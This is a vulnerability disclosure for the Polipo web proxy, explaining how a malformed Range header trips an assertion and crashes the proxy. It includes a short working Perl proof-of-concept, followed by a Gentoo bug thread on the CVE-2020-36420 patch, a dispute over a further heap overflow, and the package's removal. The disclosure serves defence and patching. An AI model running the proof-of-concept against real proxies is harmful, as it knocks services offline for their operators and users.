Subject: Polipo: denial-of-service using range

Hi all,

I suppose I found a vulnerability in the Polipo [1],
lightweight, caching web proxy.

Since the author wrote that he no longer maintains this project [2]
I decided to write here because polipo is widely used in Linux/BSD [3],
and there are many maintainers.

Summary
=======

It is possible to cause a denial of service through a specific
Range header value.

Overview
========

RFC7233 states [4]:

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
A server that supports range requests MAY ignore or reject a Range
header field that consists of more than two overlapping ranges, or a
set of many small ranges that are not listed in ascending order,
since both are indications of either a broken client or a deliberate
denial-of-service attack (Section 6.1). ...
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

Polipo doesn't ignore/reject the malformed header. Instead, it has
an assertion:

    server.c:1473: assert(from >= 0 && (to < 0 || to > from));

So, a malformed Range header ("Range: bytes=3-2" for example) will
cause an assertion failed.  This error handling allows an attacker
to cause a denial of service.

PoC
===

#!/usr/bin/perl
use autodie;
use Socket;

$host = $ARGV[0];
$port = $ARGV[1];

$iaddr = inet_aton($host);
$paddr = sockaddr_in($port, $iaddr);
$proto = getprotobyname('tcp');

socket(SOCK, PF_INET, SOCK_STREAM, $proto);
connect(SOCK, $paddr);
send(SOCK, "GET http:// HTTP/1.1\r\n", 0);
send(SOCK, "Range: bytes=3-2\r\n\r\n", 0);
print while <SOCK>;

| [Description](#c0)  John Helmert III   archtester Gentoo Infrastructure gentoo-dev Security  2020-11-21 00:23:28 UTC  ``` From $URL:  RFC7233 states [4]:  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - A server that supports range requests MAY ignore or reject a Range header field that consists of more than two overlapping ranges, or a set of many small ranges that are not listed in ascending order, since both are indications of either a broken client or a deliberate denial-of-service attack (Section 6.1). ... - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  Polipo doesn't ignore/reject the malformed header. Instead, it has an assertion:      server.c:1473: assert(from >= 0 && (to < 0 || to > from));  So, a malformed Range header ("Range: bytes=3-2" for example) will cause an assertion failed.  This error handling allows an attacker to cause a denial of service.    Polipo is unmaintained, so no patches available. ```  [Comment 1](#c1)  Conrad Kostecki   gentoo-dev  2021-07-13 11:44:09 UTC  ``` Upstream project has been marked as archived / read-only. ```  [Comment 2](#c2)  John Helmert III   archtester Gentoo Infrastructure gentoo-dev Security  2021-07-14 17:25:57 UTC  ``` CCing treecleaner, package is unmaintained upstream ```  [Comment 3](#c3)  Larry the Git Cow   gentoo-dev  2021-07-14 19:08:15 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=6090311521594e454fd6366e5f453a1993512709>  commit 6090311521594e454fd6366e5f453a1993512709 Author:     John Helmert III <ajak@gentoo.org> AuthorDate: 2021-07-14 18:55:24 +0000 Commit:     John Helmert III <ajak@gentoo.org> CommitDate: 2021-07-14 19:05:49 +0000      package.mask: Last rite net-proxy/polipo          Bug: <https://bugs.gentoo.org/755896>     Bug: <https://bugs.gentoo.org/781467>     Signed-off-by: John Helmert III <ajak@gentoo.org>   profiles/package.mask | 5 +++++  1 file changed, 5 insertions(+) ```   [Comment 4](#c4)  NATTkA bot   gentoo-dev  2021-07-29 17:25:17 UTC  Comment hidden (obsolete)  ``` Package list is empty or all packages have requested keywords. ```   [Comment 5](#c5)  NATTkA bot   gentoo-dev  2021-07-29 17:33:50 UTC  Comment hidden (obsolete)  ``` Package list is empty or all packages have requested keywords. ```   [Comment 6](#c6)  NATTkA bot   gentoo-dev  2021-07-29 17:41:43 UTC  Comment hidden (obsolete)  ``` Package list is empty or all packages have requested keywords. ```   [Comment 7](#c7)  NATTkA bot   gentoo-dev  2021-07-29 17:49:52 UTC  Comment hidden (obsolete)  ``` Package list is empty or all packages have requested keywords. ```  [Comment 8](#c8)  NATTkA bot   gentoo-dev  2021-07-29 18:05:46 UTC  ``` Package list is empty or all packages have requested keywords. ```  [Comment 9](#c9)  Larry the Git Cow   gentoo-dev  2021-08-11 14:55:05 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=50377a1996dc8e19e54e1d7322733eff93b90938>  commit 50377a1996dc8e19e54e1d7322733eff93b90938 Author:     Andrew Savchenko <bircoph@gentoo.org> AuthorDate: 2021-08-11 14:51:46 +0000 Commit:     Andrew Savchenko <bircoph@gentoo.org> CommitDate: 2021-08-11 14:54:55 +0000      profiles: apply net-proxy/polipo mask only to vulnerable versions          Bug: <https://bugs.gentoo.org/755896>     Bug: <https://bugs.gentoo.org/781467>          Signed-off-by: Andrew Savchenko <bircoph@gentoo.org>   profiles/package.mask | 9 ++++-----  1 file changed, 4 insertions(+), 5 deletions(-)  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=a6d841717c0d8a3cd1c56a88f0bd067551762384>  commit a6d841717c0d8a3cd1c56a88f0bd067551762384 Author:     Andrew Savchenko <bircoph@gentoo.org> AuthorDate: 2021-08-11 14:47:20 +0000 Commit:     Andrew Savchenko <bircoph@gentoo.org> CommitDate: 2021-08-11 14:54:51 +0000      net-proxy/polipo: fix CVE-2020-36420          Discard packet with invalid range field instead of raising assert, this     conforms to RFC7233.

This package isn't maintained upstream any longer (since 2016!) and after doing some tests, ajak and I have reproduced another heap buffer overflow *with* your patch.  I don't feel that adding piecework patches now will will fix the myriad issues that seem present, given that ASAN blows up pretty quickly with *valid* input (using an adapted version of the Perl script from the oss-security thread).  If you want to maintain a full fork, that's your perogative, but it will require more than a few quick patches to get it up to any sort of safe standard. I don't know if you want to make such a large time commitment.  We suspect there's likely to be other issues given how simple this one was, and its utility is rather diminished in 2021 anyway given the use of HTTPS. AFAIK, you may be able to use Squid for this instead - which, while heavier, is a lot more battle-hardened.  > I'm not sure if there is a need to stabilize this package.  The previous version (1.1.1-r4, before your patch) in Gentoo has stable keywords for both amd64 and x86, so stabilisation would be required if we were keeping the package to protect users.  I'd also note that while you've unmasked the package, it still has QA issues: * [bug 781467](show_bug.cgi?id=781467 "RESOLVED FIXED - net-proxy/polipo: migrate to GLEP 81") (GLEP 81 support) has not been resolved; * seems to use DEPEND incorrectly (texinfo should be BDEPEND afaik?); * unusual conditional installation of cron files based on USE=systemd (although   there may be a few other cases of this in tree); * still retains the live ebuild (even though upstream's repository is archived).  So, with all that said, I'm going to restore the mask. I don't think it's in a suitable state for users and I don't see the issue as resolved. ```  [Comment 12](#c12)  Larry the Git Cow   gentoo-dev  2021-08-11 21:14:55 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=8dac54528398bcd32c75fedc037bbe388b192e1f>  commit 8dac54528398bcd32c75fedc037bbe388b192e1f Author:     Sam James <sam@gentoo.org> AuthorDate: 2021-08-11 21:14:20 +0000 Commit:     Sam James <sam@gentoo.org> CommitDate: 2021-08-11 21:14:46 +0000      Revert "profiles: apply net-proxy/polipo mask only to vulnerable versions"          See bug for explanation; package is still vulnerable.

What do you mean by *another*? CVE-2020-36420 is NOT a buffer overflow! Please read this CVE or my patch (or both). This CVE is about an assert working on invalid packet header field instead of discarding or ignoring such packet. As any assert it leads to controlled program termination, there are no overflows here. I can hardly call this vulnerability, but formally it may be called so of course: if local user decides to kill his own local polipo instance, they can do it this way.  If you have found another problem, please report it separately and register another CVE.  > I don't feel that adding piecework patches now will will fix the myriad > issues > that seem present, given that ASAN blows up pretty quickly with *valid* > input (using an adapted version of the Perl script from the oss-security > thread).  Asan will blow up on half of the portage tree in one or other configuration. Furthermore asan is known to occasionally produce false or unrelated warnings.  > If you want to maintain a full fork, that's your perogative, but it will > require more than a few quick patches to get it up to any sort > of safe standard.

This is not just question of being heavier (though such argument is valid concern by itself). In my opinion the Squid is less secure, because of much larger code size. Compare number of CVEs reported for squid and polipo over 10 years or so. This means that right now Squid is vulnerable, but these vulnerabilities are not yet disclosed or even reported, this will be done later with timeflow. The same is valid for polipo of course. But smaller code mean smaller attack surface and smaller number of mistakes. Of course lack of active maintenance hampers polipo security, but it is still at reasonable levels IMO.   > > I'm not sure if there is a need to stabilize this package. >  > The previous version (1.1.1-r4, before your patch) in Gentoo has stable > keywords > for both amd64 and x86, so stabilisation would be required if we were keeping > the package to protect users.  I'm fine with this. If package would not be masked, I would proceed this way without questions. Since it is already masked I decided that maybe stable version is not needed. I don't object to stable version to be available, of course.  > I'd also note that while you've unmasked the package, it still has QA issues:  Let me note that this is security bug, not QA bug. Let's not mix different issues in the single bug. While unfixed CVE is valid reason for PMASK, minor QA issues are not.

So we have chicken and the egg problem here. To unravel it I fixed CVE and propesed original author to reapply GLEP 81 changes, adding myself for fallback if there will be no activity or interest.

I don't use systemd myself even on test setups (and will not recommend other people to use it), so I provide only third-party systemd support in my packages: either upstream, or user, or other dev contributed as long as they don't break non-systemd setups.  > * still retains the live ebuild (even though upstream's repository is > archived).

Sure. Requested. It will be added to this bug, and will be another reason to remove the package, and likely another reason for other distributions to start to remove the package.  > > I don't feel that adding piecework patches now will will fix the myriad > > issues > > that seem present, given that ASAN blows up pretty quickly with *valid* > > input (using an adapted version of the Perl script from the oss-security > > thread). >  > Asan will blow up on half of the portage tree in one or other configuration. > Furthermore asan is known to occasionally produce false or unrelated > warnings.

Please revert your > latest commit with full PMASK.  CVEs don't equate to vulnerabilities. There's an obvious heap overflow here that multiple people have reproduced. The fact that this vulnerability doesn't have a CVE doesn't mean it doesn't exist.  You can reproduce by modifying the Perl script to send a valid Range header. ```  [Comment 17](#c17)  Larry the Git Cow   gentoo-dev  2021-08-14 19:13:04 UTC  ``` The bug has been referenced in the following commit(s):  <https://gitweb.gentoo.org/repo/gentoo.git/commit/?id=58902da07474481bbbe106f55128e25fd9e5d1fa>  commit 58902da07474481bbbe106f55128e25fd9e5d1fa Author:     Jakov Smolic <jakov.smolic@sartura.hr> AuthorDate: 2021-08-14 19:12:29 +0000 Commit:     David Seifert <soap@gentoo.org> CommitDate: 2021-08-14 19:12:29 +0000      net-proxy/polipo: Remove last-rited pkg          Closes: <https://bugs.gentoo.org/781467>     Bug: <https://bugs.gentoo.org/755896>     Signed-off-by: Jakov Smolic <jakov.smolic@sartura.hr>     Signed-off-by: David Seifert <soap@gentoo.org>   net-proxy/polipo/Manifest                          |  1 -  net-proxy/polipo/files/config                      |  8 ---  .../polipo/files/polipo-1.1.1-cve-2020-36420.patch | 26 ---------  net-proxy/polipo/files/polipo.crond-2              | 22 --------  net-proxy/polipo/files/polipo.initd-5              | 65 ----------------------  net-proxy/polipo/files/polipo_at.service           | 11 ----  net-proxy/polipo/metadata.xml                      |  7 ---  net-proxy/polipo/polipo-1.1.1-r4.ebuild            | 60 --------------------  net-proxy/polipo/polipo-1.1.1-r5.ebuild            | 61 --------------------  net-proxy/polipo/polipo-9999.ebuild                | 61 --------------------  profiles/package.mask                              |  5 --  11 files changed, 327 deletions(-) ``` |  |
